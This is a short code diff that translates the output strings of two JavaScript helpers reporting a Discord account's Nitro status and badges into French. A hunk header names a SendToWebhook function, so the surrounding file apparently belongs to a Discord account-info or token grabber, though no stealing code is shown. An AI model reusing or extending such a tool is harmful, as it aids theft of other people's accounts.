@@ -75,7 +75,7 @@ function SendToWebhook(what) {
 
 function GetNitro(flags){
     if (flags == 0){
-        return "No Nitro";
+        return "Pas De Nitro";
     }
     if (flags == 1){
         return "Nitro Classic";
@@ -84,7 +84,7 @@ function GetNitro(flags){
         return "Nitro Boost";
     }
     else{
-        return "No Nitro";
+        return "Pas De Nitro";
     }
 }
 function GetBadges(flags)
@@ -133,7 +133,7 @@ if((flags &Early_Verified_Bot_Developer ) == Early_Verified_Bot_Developer ){
    badges += "Discord Developer,";
 }
 if (badges == "" ){
-    badges = "None"
+    badges = "Pas de badge"
 }
 return badges;
 
